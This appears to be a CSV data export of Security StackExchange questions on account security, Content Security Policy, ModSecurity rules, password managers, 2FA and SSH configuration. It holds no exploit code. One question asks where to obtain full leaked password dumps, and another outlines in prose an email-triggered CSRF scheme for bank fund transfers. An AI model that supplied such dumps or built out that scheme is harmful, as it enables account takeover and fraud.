Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate,ContentLicense
"205123","1","","","2019-03-10 22:11:01","","0","842","<p>I have an old private tablet at work with my private Google account on it .It's connected to our WiFi, where i logged in with my personal working code. Never use it much as I just play some music on it.</p>

<p>Today I saw that my browsing and history from my computer back home came up in Chrome on the tablet.</p>

<p>My question is: can my job see what am browsing at home just because am logged in on the tablet? Or is this information encrypted from Google? Never use the tablet at work for browsing purposes.</p>
","201575","","59503","","2019-03-10 23:08:48","2019-03-11 00:28:46","Private Google account at work","<google><chrome><account-security>","2","0","","","","CC BY-SA 4.0"
"138203","1","138209","","2016-09-29 08:59:08","","11","3775","<p>I am testing out the tool <a href=""https://csp-evaluator.withgoogle.com/"" rel=""noreferrer"">CSP Evaluator</a>, and have a question regarding the following content-security-policy:</p>

<blockquote>
  <p>default-src <a href=""https://maps.googleapis.com"" rel=""noreferrer"">https://maps.googleapis.com</a></p>
</blockquote>

<p>The tool consider this as a high risk:</p>

<blockquote>
  <p>maps.googleapis.com is known to host JSONP endpoints which allow to
  bypass this CSP.</p>
</blockquote>

<p>My question is, how can a trusted maps.googleapis.com be exploited to perform an XSS attack?</p>
","3165","","3165","","2016-09-29 11:57:06","2016-09-29 11:57:06","How does a trusted maps.googleapis.com in CSP enable an XSS vulnerability? (JSONP)","<xss><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"138253","1","138255","","2016-09-29 17:26:08","","2","311","<p>I just was wondering what is considered a common practice in the security community for securely sending files back forth between company and client. For example, at the company I work for, we receive Excel files from our clients through our web portal, we then review them and send them back via email. A problem came up where a file was emailed to the wrong client. </p>

<p>We have started using our website to transfer files back and forth since then, but the design and process by which documents are assigned to clients <em>-so that only they can see the document on their login-</em> is really not efficient. It is multiple steps and takes longer than it should to simply say ""<em>x</em> should see <em>y</em>"".</p>

<p>Anyway, the company I work for thinks that they're smarter than everyone else and no one really has any database, programming, IT, or security experience so they want to have these long drawn out conversations that are essentially reinventing the wheel. Reinventing the wheel in that there a common practices that companies utilize millions of times a day.</p>

<p>So this is the question. How are most companies sending their confidential information between themselves and clients?</p>

<p>I know with institutions I personally bank with or have credit cards through, it is all through their customer portal. They probably just have a more efficient way of assigning docs to clients than we have.</p>
","87104","","59403","","2016-09-29 20:23:12","2016-09-30 01:37:46","Securely transferring files back and forth between company and clients","<account-security><documents>","3","0","","","","CC BY-SA 3.0"
"464","1","478","","2010-11-18 22:00:03","","18","553","<p>If a security measure is implemented that doesn't provide any additional security benefit, can it be considered harmful?</p>

<p>As an example, consider a login page where the user is asked to enter their username, and then their password twice (for ""security reasons"").</p>

<p>There are two arguments here:</p>

<ol>
<li>If it gives the user peace of mind and isn't <em>decreasing</em> security, then what's the harm?</li>
<li>If there's no actual benefit, the additional ""peace of mind"" given to the user is harmful because it gives them a greater sense of security than is valid.</li>
</ol>

<p>I've frequently argued the second point, but the first opinion seems to be more common - particularly in the business community.</p>

<p>What do you think? Should redundant security measures be actively removed or is there really no harm in keeping them?</p>

<p><em>Note: the example isn't an actual case</em></p>
","179","","618","","2011-01-14 01:46:07","2011-01-14 15:50:31","Is a ""security measure"" that doesn't provide a security benefit actually harmful?","<web-application><passwords><security-theater>","7","1","","","","CC BY-SA 2.5"
"138361","1","","","2016-09-30 15:54:10","","13","4032","<p>If I delete an email from a popular provider (Gmail), would it be possible for somebody to register a new email account under the same name and use it to steal my identity? For example, my email address is abc@gmail.com and after it is deleted the name becomes available again so the attacker registers the same address - abc@gmail.com.</p>

<p>Not only would that person be able to impersonate me by sending emails from an address that belonged to me but also access accounts that were previously created with that email account (if they had any knowledge of where I was registered in, because the inbox would be empty, or they could also try logging in on popular websites like Facebook or Ebay to see if they return ""no account with this email address"" or ""wrong password"") and access them (by using ""I forgot my password"" links that send the link to reset the password to the email that is now in control of the attacker).</p>
","113958","","113958","","2016-09-30 16:09:01","2016-09-30 18:41:52","Is it dangerous to delete my email account?","<email><account-security><identity-theft>","2","1","","","","CC BY-SA 3.0"
"205378","1","205379","","2019-03-14 19:03:44","","1","182","<p>I'm planning to run/have some quite sensitive data on a VPS, however, knowing well that the host could at any time access the data (rare but as long as it could happen in theory, I would very much like to have some sort of contingency planning down). Could it be possible to practice some sort of ""damage control""?</p>

<p>For example, the method mentioned in:
<a href=""https://www.howtogeek.com/123568/how-to-get-email-notifications-whenever-someone-logs-into-your-computer/"" rel=""nofollow noreferrer"">https://www.howtogeek.com/123568/how-to-get-email-notifications-whenever-someone-logs-into-your-computer/</a></p>

<p>Would it be enough, as one would be notified whenever someone else accesses the server? Or can a host easily bypass it regardless? For example via a ""maintenance"" and then extraction, where internet would be off?</p>

<p>Although since most VPS providers claim 99% up-time and assuming that an ""evil host"" would probably initially check what's on a machine through internet first, inevitably having to log in. Would this be an okay method regardless? </p>

<p>Unless of course they have a very elaborate and near-impossible to detect monitoring software installed on every machine, which for example, occasionally takes screenshots, giving the provider information on which machine could be ""interesting"" to inspect further... although could this also, simply be combated by a re-formatting before usage?</p>

<p>Looking forward to any and all feedback</p>
","201931","","","","","2019-03-14 19:39:34","Could it be possible to diminish the damage of having one's VPS inspected by the host?","<access-control><account-security><physical-access><vps>","1","2","","","","CC BY-SA 4.0"
"138458","1","","","2016-10-01 13:11:56","","3","1318","<p>I heard in a podcast a while back (I believe it was Steve Gibson's <a href=""https://www.grc.com/securitynow.htm"" rel=""nofollow"">Security Now</a>) that running Windows as standard user vs. administrator mitigates 99% of Windows vulnerabilities (I <em>think</em> that was the correct percentage I heard). Anyone have a source to back this up? Also, what is the best way to configure this? What I did on my machine is enable the local admin account and added a strong password to it. I then changed my Microsoft account to standard user. Whenever I need admin permissions, I need to enter the password of the admin account I enabled. Is this the most secure way to enable this? </p>

<p>Also, anyone have any ideas why this is not always configured within.   organizations? I worked in security for a large consulting company, and this never came up. Users always run as admin vs. having to type a password. It seems like this would be the simplest way to drastically improve the security posture of the organization.</p>
","69190","","","","","2016-10-01 13:31:43","Security benefits of running as standard user vs. administrator","<windows><account-security><windows-permissions>","1","0","","","","CC BY-SA 3.0"
"138481","1","138482","","2016-10-01 21:02:15","","0","1562","<p>Everything I try to log into doesn't work. I constantly have to change my password through an email. It's really odd. </p>

<p>I do use the same password for most of my accounts. It's not something obvious mind you, but still, I use the same one or a variation of it. I have different special passwords and two-level steps for things that are important (like my email or my paypal account), but for Netflix and such I use my normal ""easy"" password. </p>

<p>That being said, I'm a rather cautions and aware user. I haven't downloaded or installed anything of suspicious nature. Also, I'm not sure this isn't a coincidence. Maybe I just forgot a few of my variations for these few different sites.</p>

<p>Anyway, to be on the safe side, what should I do now? Like, what's my immediate steps? I'm assuming my email wasn't hacked at this point.</p>
","80548","","","","","2016-10-01 21:43:12","My passwords keep getting rejected","<account-security>","1","2","","2016-10-02 17:26:49","","CC BY-SA 3.0"
"138483","1","138502","","2016-10-01 21:44:54","","3","6768","<p>Is it a great idea to make passwords with special characters from your language? (If you have it)</p>
<p>BTW it´s not allowed on every website.</p>
<p>Is it a way to make it a bit harder for hackers to crack your password?</p>
","126168","","6253","","2023-03-01 18:57:12","2023-03-01 18:57:12","Make password using special characters","<password-management><account-security>","2","3","","","","CC BY-SA 4.0"
"138684","1","138700","","2016-10-04 05:07:08","","3","2800","<p>In my Spring MVC 3 application, I am following REST patterns and lots of logic is based on HTTP status codes. For instance 500 defines a server error. But <a href=""https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/master/base_rules/modsecurity_crs_50_outbound.conf"" rel=""nofollow noreferrer"">OWASP modsecurity</a> says not to expose this status code.</p>

<p>I don't understand why a 500 status code would be bad?
I see even <a href=""https://i.stack.imgur.com/E0awT.png"" rel=""nofollow noreferrer"">Google showcases 500 properly</a>.</p>
","6862","","98538","","2016-10-04 09:12:08","2016-10-04 09:12:08","Should I expose HTTP status code 500 on a REST application?","<web-application><http><rest><mod-security>","2","2","0","","","CC BY-SA 3.0"
"138851","1","138852","","2016-10-05 18:32:37","","4","2226","<p>After a lot of research about password manager and a lot of reference obtained from this discussion
<a href=""https://security.stackexchange.com/questions/45170/how-safe-are-password-managers-like-lastpass"">How safe are password managers like LastPass?</a>
I come to the conclusion that password managers have some really scary point of failure, if my machine or mobile device is compromised when I use my master password and the U2F key to unlock the password manager (I am thinking something like yubikey or nitrokey) then all of my password can be stolen, even the ones that I use the less (like amazon account with my Credit Card information saved).</p>

<p>Reading the discussion and other opinions I got the impression that everyone says ""If you lose the security of your machine than you are already ******"", but there are cases when that isn't really true, think about the password that I use only a few times per year, like from online stores but with my CC credentials, in the time from the begin of the infection and the time I use the password I could get rid of the malware (formatting, antivirus) or I could use the password on another machine and the malware never gets this information.
With a password manager every password saved can be stolen.</p>

<p>So, I was thinking that the best way to use a password manager is to:</p>

<p>-never save critical password like bank account</p>

<p>-never let the password manager ""open"" (logged in)</p>

<p>-never use the autocomplete, even if the clipboard is another place unsecure and in this discussion tylerl had a point for the risk of fake sites 
<a href=""https://security.stackexchange.com/questions/45066/does-the-average-user-really-need-a-password-manager?noredirect=1&amp;lq=1"">Does the average user really need a password manager?</a>
But I read about some attacks via browser that can access even to other password without a trace, so better safe than sorry.</p>

<p>So reading the functionality for some of the most famous password managers, like lastpass or keepass, I was searching for a chance to decrypt only the single password needed, so if the machine is compromised only this password can be stolen. But it looks like it is impossible.</p>

<p>It's possible to add another layer of security?</p>

<p>What if I use an external drive to save the offline archive, with a different file system and encryption in read-only mode, that could help?</p>

<p>I know, I am a little paranoid, but when I am going to use some new software o practice I want to use the most secure and correct way to do it. So now I am confused and worried, I want a relatively simple way to access to my passwords but really difficult for others to get their hands on my data.</p>

<p>Sorry for my English</p>
","126539","","-1","","2017-03-17 13:21:41","2016-10-05 19:02:58","Password managers with U2F security risks","<passwords><password-management><account-security><u2f>","4","0","","","","CC BY-SA 3.0"
"205715","1","","","2019-03-19 17:04:24","","0","1518","<p>I'm not a security guy, so bear with me. As discussed in other topics, usernames in and of themselves are valid forms of verification, and there's nothing particularly sensitive or secure about usernames. For example, in most registration flows, when selecting a username, the system will tell the user whether a username is taken - thus potentially giving malicious users a list of valid usernames. And that's okay, the same things happen in most password recovery flows.</p>

<p>A suggested flow for a user that is trying to recover their forgotten username would be to allow them to type in their phone or email, and the system would instantly return their username in the UI without verification. </p>

<p>The main problem that I could see is that this may allow a malicious user to not only obtain the username, but also to associate it with phone/email. Maybe that's okay too though, because that doesn't give any vital information. To access an account, they would still need access to that phone or email to reset the password. In that respect I don't believe the account would be compromised. </p>

<p>Help me out, what are the flaws in my thinking here?</p>
","202301","","","","","2019-03-19 18:37:27","Account Recovery: Displaying username without verification","<account-security><password-reset><user-names><recovery>","2","0","","","","CC BY-SA 4.0"
"205772","1","205794","","2019-03-20 15:40:00","","2","626","<p>Here is an example of the CSP of accounts.google.com:</p>

<pre><code>content-security-policy: script-src 'nonce-DanEwkxkS1rktq35Z1hVcg' 'unsafe-inline' 'unsafe-eval';object-src 'none';base-uri 'self';report-uri /cspreport
</code></pre>

<p>The ""nonce"" means it will add a whitelist to a script that has the unique ID of ""DanEwkxkS1rktq35Z1hVcg"" (if I understand correctly). But after that, they allow use of inline script tags as well as the eval() function (through ""unsafe-inline"" and ""unsafe-eval"" respectively). So what's the point of giving a specific whitelist to a script with ID ""DanEwkxkS1rktq35Z1hVcg"", but also allowing all inline scripts? Do I fundamentally misunderstand something about how CSP works?</p>
","202382","","","","","2019-03-20 22:28:41","Trying to understand Content-Security-Policy: Why do some sites (e.g Google) use a ""nonce"", but also allow all inline scripts and use of eval()?","<content-security-policy>","1","0","","","","CC BY-SA 4.0"
"205866","1","","","2019-03-22 09:21:57","","1","84","<p>I am looking for any reliable, up-to-date sources (which may be RSS feeds, websites, or anything else OSINT-based) which contain password dumps and their relative links.</p>

<p>I am looking particularly for the full dumps.</p>

<p>Does anybody know where can I find them?</p>

<p>Thanks a lot.</p>
","186606","","","","","2019-03-22 09:21:57","Are there any reliable and updated sources or feeds for password dumps?","<passwords><account-security><have-i-been-pwned>","0","1","","2019-03-22 10:43:23","","CC BY-SA 4.0"
"139061","1","139068","","2016-10-07 11:55:12","","0","148","<p>I recently signed up for a webpage. When I opened the customary ""click this link to validate your email and pick a password"" email my client notified me that the sender had requested a read receipt. I opted not to send one, and could complete the sign up anyway.</p>

<p>I was a bit surprised, since this has never happend to me before on a similar email. Being of the curious kind, I started to speculate why they request receipts, and how they could be used to enhance security. Maybe it is related to token invalidation, but how?</p>

<p>I fail to understand how they could be used. Perhaps you have any ideas?</p>
","98538","","","","","2016-10-07 12:24:09","Can read receipt on sign up and password reset emails be used to enhance security?","<email><account-security><password-reset>","1","1","","","","CC BY-SA 3.0"
"139107","1","139111","","2016-10-07 18:23:49","","-1","244","<p>Assuming that person may leak the APK to another person with security expertise (and even tell the password), how do I ensure the app is made (practically) inaccessible to anyone but that person?</p>
","126782","","","","","2018-06-02 04:19:17","I'm building an Android app for one person and only that person should access it. How do I keep it secure?","<account-security>","2","1","","","","CC BY-SA 3.0"
"206048","1","","","2019-03-25 13:59:40","","0","231","<p>I am learning to design a system where it can be guarded against XSS &amp; CSRF attack. <br> I'll quickly list down my understanding and then raise questions. <br>It's a simple case of fraud that I am trying to avoid.<br><br> Steps mentioned below are executed by hacker: <br></p>

<ol>
<li>Broadcast e-mail to a lot of people holding account with any specific bank on gmail yahoo etc.</li>
<li>Once mail is received, script in background is executed from the email on-load , it checks if bank website is open in any of the tabs. If not, try after regular interval.</li>
<li>Hacker is aware that in the post request, only his account number needs to be updated and money would be transferred to his account</li>
<li>Common logic is written in front-end code which adds the headers and cookies on ever request sent to server.</li>
</ol>

<p><strong>Question:<br></strong>
Is the above attack possible?</p>

<p><strong>Answers: (From my understanding)<br></strong>
If hacker knows the payload required for fund transfer, hacker would simply hook onto mouse movement event and being aware about the url and payload would fire the request for fund transfer.<br> Cookies and other header details would be passed along as front-end team for simplicity have written logic to add these fields with every http request.<br><strong><em>Please corrent me if I am wrong.</em></strong></p>

<p>Please highlight if any of the steps undertaken by hacker(1-4) are not practically possible</p>
","202742","","195961","","2019-03-25 15:17:11","2021-05-11 09:08:10","Application design to avoid XSS & CSRF attacks","<xss><csrf><account-security><angularjs><react>","1","5","","","","CC BY-SA 4.0"
"206084","1","","","2019-03-25 19:13:41","","-2","224","<p>I recently received an email from a company sending me a security code that I didn’t ask for. It showed me the IP address that the request came from and it shows that it is in Romania but I live in the US. How can i report this adress?</p>
","202781","","","","","2019-03-25 20:37:54","What’s the best way to report an IP address from Romania?","<ip><account-security>","1","3","","","","CC BY-SA 4.0"
"206157","1","206161","","2019-03-26 18:00:14","","2","283","<p>In my college computer that runs Windows 7 Professional SP1 I have an administrator account. I have full access to the entire computer and the files of every other account that's signed up. </p>

<p>The problem is: I'm not the only administrator, and they have the same access level as I do. Every time after I'm done using the computer I have to clear my browser history, sign off of every application I was using and place my files in a password protected compacted file. All this process is really inconvenient and bothersome. I've been looking after a solution to this issue for a while now, and already considered:</p>

<ul>
<li><p>Creating a VM, using full-disk encryption. This obviously works but I'd like to avoid this.</p></li>
<li><p>Creating an encrypted volume with something like Veracrypt, the problem is that I could only install portable applications there (I think).</p></li>
<li><p>Encrypt my user folder. This would be a great solution that is available on Linux through eCryptfs, but I don't know if it's possible in Windows.</p></li>
</ul>

<p>All the solutions I found online do not consider a shared computer and multiple system admins. </p>

<p>I hope one of you has an answer to this.</p>
","202889","","6253","","2019-03-26 20:09:41","2019-04-30 05:35:05","Is it possible to create a truly private user account in a public computer?","<encryption><account-security><windows-7>","4","2","","","","CC BY-SA 4.0"
"41247","1","41252","","2013-08-26 16:41:18","","35","3632","<p>When Lotus Notes asks for the password, it displays a screen with a picture that appears to change after a new character is entered after the fifth character.</p>

<p><img src=""https://i.stack.imgur.com/Q1Phx.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/RQQx4.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/jqGc9.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/uf9su.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/6JeLX.png"" alt=""Lotus Notes password prompting"">
<img src=""https://i.stack.imgur.com/WmE5Y.png"" alt=""Lotus Notes password prompting""></p>

<p>I have noticed the sequence of pictures is the same between closing and reopening Lotus Notes. Is this to distract an attacker from looking at the keyboard as someone types? Has this ever been proven effective? Also as far as I can tell a random amount of x's are added after each character is typed in. I guess this is so an attacker can't see the password length, but is there a point to having anything at all because the user doesn't know how many characters are typed?</p>

<p>EDIT: for what it's worth I didn't even realize the pictures were the same each time I typed in a password.</p>
","10714","","10714","","2013-08-27 17:08:59","2020-09-11 11:44:53","Changing picture as characters entered into password","<passwords><security-theater>","3","5","","","","CC BY-SA 3.0"
"253962","1","","","2021-08-04 13:57:38","","0","317","<p>In case we lose access to our 2 Factor Authenticator, we can use our one time recovery codes to regain access to our accounts</p>
<p>But what if we store the setup key itself instead of the recovery codes? We can still recover the account by adding the setup key to another authenticator.</p>
<p>I think recovery keys are better because they can be shared with other trustable people to keep them safe for you. If a recovery code has been used, we get notified. And they are limited in number.</p>
<p>Are there any other security implications?</p>
","264243","","6253","","2021-08-04 15:33:06","2021-08-04 17:14:28","Should I save my 2FA setup keys instead of recovery keys?","<authentication><account-security><multi-factor><recovery>","1","4","","","","CC BY-SA 4.0"
"115548","1","","","2016-02-23 21:32:32","","1","976","<p>Trying to connect to GoogleTalk from the Trillian app for Android (a universal instant messenger app), I got denied even with the correct password. Then Google e-mailed me saying that my password is compromised and that an access to my account was blocked from IP <code>74.201.35.40</code> (somewhere in the USA).</p>

<p>Does it mean the Trillian application is spoiled (trying to steal my Google account), or is it just poorly programmed so that it's their server that connects to Google rather than me? Or something else? Should I stop using the app?</p>
","21430","","21430","","2016-02-23 23:03:09","2016-06-22 12:42:52","Is Trillian application unsafe? (Got ""Someone has your password"" message from Google)","<passwords><android><google><account-security>","1","5","","","","CC BY-SA 3.0"
"254084","1","","","2021-08-08 16:43:58","","-1","206","<p>I have an application that rewards users for placing orders with certain merchants. In order to verify that the order was actually placed and delivered, a user is required to grant us read access to a new <a href=""https://stackoverflow.com/a/36894292"">Gmail Inbox</a> that is created and shared with us for this purpose. This allows us to read order confirmation emails, shipping confirmation emails and for some merchants the delivery email. If the order was canceled then we'd be able to read the order cancellation email as well. The goal is to minimize the risk of a user placing an order on a merchant site and then canceling it without us knowing about it. I have a few doubts about this approach:</p>
<ol>
<li><p>Can a user spoof the contents of an email to make it look like an order or delivery confirmation email was received from a merchant when in fact wasn't?</p>
</li>
<li><p>Can a user delete an order cancellation email from his inbox before we get a chance to read it? If yes, is there a to detect that an email was deleted?</p>
</li>
<li><p>I realize a user can revoke access to his inbox at any time, add or remove emails and then re-grant access. However, I don't think this would be a problem because should we detect that access was revoked at any time between the order and delivery we can reverse any rewards linked to those orders. Is this correct?</p>
</li>
<li><p>Are there any other risks associated with this approach?</p>
</li>
<li><p>Would the same apply to other email providers such as Outlook (Microsoft), Apple and Yahoo Mail?</p>
</li>
</ol>
<p>We do have other ways of confirming orders but each approach has certain flaws and weaknesses. My goal is to understand the weakness of this approach (if any) and work with the strengths of each approach to eliminate or reduce the likelihood of fraud.</p>
<p>How reliable is this approach?</p>
","264419","","6253","","2021-08-09 22:41:01","2021-08-09 22:41:01","Is it Safe to Rely on Gmail API to Reward Users for Placing Orders on Merchant Sites?","<email><account-security><gmail><email-spoofing><fraud>","2","6","","","","CC BY-SA 4.0"
"254155","1","254164","","2021-08-11 00:39:31","","2","365","<p>If I get hit with malware while performing daily tasks (e.g. - checking email, web browsing, etc.) with a root shell, the malware will own my machine.</p>
<p>If the aforementioned occurs whilst on a standard account with the ability to run sudo, the malware will be limited to whatever privileges this account has without sudo.</p>
<p>What if the malware had the ability to log keystrokes? Would it not just capture the password the next time I elevate my privileges with sudo, thereby, gaining the ability to become root? Do I have this wrong? If not, I think it would be safer to create another standard account without the ability to use 'sudo' and use that for my daily tasks. Is this common?</p>
","186033","","","","","2021-08-11 10:01:47","If browsing the web with root is dangerous, isn't browsing the web with a sudo enabled account only marginally safer?","<linux><account-security><privilege-escalation><principle-of-least-privilege>","1","0","","","","CC BY-SA 4.0"
"254193","1","255184","","2021-08-12 09:45:02","","1","2926","<p>I am bewildered as to the below config and subsequent behaviour.</p>
<p>/etc/ssh/sshd_config:</p>
<pre><code>AuthorizedPrincipalsFile /etc/ssh/principals
</code></pre>
<p>/etc/ssh/principals:</p>
<pre><code>all
host.example.com
dev
</code></pre>
<p>This allows me to login as <em>ANY</em> user using my cert which has one or more matching principals.</p>
<p>What am I missing here?</p>
<p>I see now it's meant to be:</p>
<pre><code>AuthorizedPrincipalsFile /etc/ssh/principals/%u
</code></pre>
<p>but surely my (mis)configuration should not allow any user?</p>
<p>Ubuntu 18.04.5 LTS<br />
OpenSSH_7.6p1 Ubuntu-4ubuntu0.3, OpenSSL 1.0.2n  7 Dec 2017</p>
","242574","","","","","2021-09-13 16:38:27","OpenSSH AuthorizedPrincipalsFile Allows Any User","<authentication><certificates><certificate-authority><account-security><openssh>","1","0","","","","CC BY-SA 4.0"
"182405","1","","","2018-03-27 15:05:43","","0","1060","<p>I'm looking to build up some stats and tune my detection rules for my webservers. I'm struggling with one major issue, though. How can I run my ModSecurity rules against past requests based on my access/error logs?</p>

<p>An other approach could be to extract regexes from ModSecurity but I struggle to find a way to do that.</p>
","174086","","98538","","2018-03-27 17:20:33","2018-08-15 18:35:40","How to test ModSecurity rules against access/error logs?","<waf><mod-security>","2","0","","","","CC BY-SA 3.0"
"254302","1","","","2021-08-16 14:40:33","","0","112","<p>Let's say there is a small organization called &quot;Example&quot; with the registered domain &quot;example.com&quot;.</p>
<p>There is a person, Bob, who has full control over the organization's GitHub account. Bob also manages the organization's AWS account.</p>
<p>Bob also writes BAU code for this organization.</p>
<p>In order to follow the modern security standards, what should be the setup of Bob's emails and accounts?</p>
<p>Some example setups (not exhaustive, just to illustrate what I mean):</p>
<p>Example 1:</p>
<ul>
<li>1 email bob@example.com</li>
<li>1 AWS account registered with this email used for admin and dev purposes</li>
<li>1 GitHub account registered with this email used for admin and dev purposes</li>
</ul>
<p>Example 2:</p>
<ul>
<li>1 email bob@example.com</li>
<li>2 AWS accounts:
<ul>
<li>1 registered with bob@example.com used for admin purposes</li>
<li>1 registered with alias bob-2@example.com for dev purposes</li>
</ul>
</li>
<li>2 GitHub accounts: AWS-like arrangement</li>
</ul>
<p>Example 3:</p>
<ul>
<li>3 emails: bob_admin_github@example.com, bob_admin_aws@example.com, bob_dev@.example.com</li>
<li>2 AWS accounts:
<ul>
<li>1 registered with bob_admin_aws@example.com for admin purposes</li>
<li>1 registered with bob_dev@example.com for dev purposes</li>
</ul>
</li>
<li>2 GitHub accounts:
<ul>
<li>1 registered with bob_admin_github@example.com used for admin purposes</li>
<li>1 registered with bob_dev@example.com for dev purposes.</li>
</ul>
</li>
</ul>
","264758","","6253","","2021-08-16 14:42:52","2021-08-16 14:42:52","How many emails and accounts an organization's administrator and developer should have?","<email><account-security><privileged-account><administration>","0","2","","","","CC BY-SA 4.0"
"254333","1","254334","","2021-08-17 08:33:01","","1","448","<p>In a recent PT assignment, I overcame that a CSP policy where the <code>object-src</code> be set to <code>self</code>. When validated against Google CSP Evaluator, it reported that it the <code>object-src</code> can be set to <code>none</code> instead of <code>self</code>.</p>
<p>Would like to ask for scenarios where the <code>object-src</code> tag can be abused when it is set to <code>self</code>, as I am unable to think of any possible scenario where this can be abused when a user is unable to interact with the website (no places to login, or specify any inputs).</p>
<p>And hence, in this case it is safe to for the <code>object-src</code> tag to remain as <code>self</code> and not <code>none</code>?</p>
","257055","","","","","2021-08-17 10:07:22","HTML Object Tag","<web><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"182551","1","182570","","2018-03-29 12:48:58","","0","1306","<p>Working on a rule to block traffic based on the starting character of ARGS_NAMES either cookie, get or post </p>

<p>Example allow </p>

<p><code>name=Joe</code></p>

<p>Example block</p>

<pre><code>#name=Joe
</code></pre>

<p>Test rule that is not working</p>

<pre><code>SecRule ARGS_NAMES ""^(#.*)$"" ""phase:1,id:199,log,deny,msg:'Block Argname with hash'""
</code></pre>
","110480","","110480","","2018-03-29 14:06:28","2019-08-10 17:02:45","ModSecurity Block based on ARGS_NAMES starting character","<waf><mod-security>","2","0","","","","CC BY-SA 3.0"
"115914","1","115915","","2016-02-27 12:32:18","","-1","262","<p>I used browser developer tools to get the source page of a video from a webpage.</p>

<p>When I try to open the full URL containing the video, I see my public ip address is contained in that URL.</p>

<p>Changing that ip address to some other value, or omitting the ip address altogether does not let me download the video. I save the page, but get an empty .mp4 file.</p>

<p>Also, I found out that the video URL was contained inside a javascript section, not the html section. Does this have any relevance to what I am asking?</p>
","102765","","","","","2016-02-27 12:52:44","Why does a CDN server need my IP address to let me download a video?","<web-application><content-security-policy>","1","2","","2016-02-29 10:35:46","","CC BY-SA 3.0"
"254392","1","254395","","2021-08-19 14:01:01","","1","539","<p>We have an issue with ModSecurity rule 932150 being triggered when someone searches a site for &quot;ruby red&quot;, because (I presume) the rule thinks it's blocking potential Ruby on Rails code.</p>
<p>I found this:</p>
<blockquote>
<p>&quot;The Remote Command Execution Rule with the rule id 932150 is
triggered by a Unix command followed by a white space. Therefore zip+
and gzip+ trigger the rule, but not zip and gzip alone.&quot;</p>
</blockquote>
<p>(source: <a href=""https://security.stackexchange.com/questions/251556/modsecurity-owasp-crs-3-3-0-false-positives-on-a-wordpress-site/251583#251583"">ModSecurity OWASP CRS 3.3.0 false positives on a Wordpress site</a> )</p>
<p>The answer above has example code to disable checks on the argument <code>s</code>, e.g. <code>/search.php?s=ruby+red</code> but I don't want to disable checks on the full <code>s</code> argument. I'd like to only remove 'ruby' from the rule checks, so <code>s</code> is still checked but allows 'ruby'. Is this possible?</p>
","264899","","6253","","2021-08-19 14:34:16","2021-08-19 15:16:15","ModSecurity rule 932150 false positive, remove ruby from criteria","<mod-security>","1","0","","","","CC BY-SA 4.0"
"182893","1","","","2018-04-04 07:39:08","","4","139","<p>I'm looking at 2FA options for my Google account, and I noticed they now allow you to add a security key to your account. I'm a bit of a novice to infosec, but I'm struggling to see the benefit for me. My phone already covers the ""something you have"" component of account security. </p>

<p>The only thought I have is that a phisher could ask me to enter my 2FA code and use that to log in, and I might not notice. But I see no reason why a phisher couldn't ask me to tap the button on my security key, too.</p>

<p>Are there additional benefits to the security key that I'm not seeing?</p>
","","user43639","98538","","2018-04-04 08:01:29","2018-04-04 16:42:10","Is there a benefit to setting up a security key on an account that already has phone-based 2FA?","<authentication><account-security><u2f><hardware-token>","1","0","","","","CC BY-SA 3.0"
"254568","1","","","2021-08-24 18:40:44","","1","211","<p>Is there a way to check if someone is trying to login to my Gmail account without knowing the password (so they keep trying to guess the password and failing repeatedly or trying to guess the answers of account recovery) as opposed to trying to login and getting the password right? (I know Gmail warns you when that happens).</p>
","","user265151","-1","","2021-08-26 06:37:58","2021-12-24 07:01:40","Is there a way to know when someone tries to guess your gmail password?","<email><account-security><gmail>","1","2","","","","CC BY-SA 4.0"
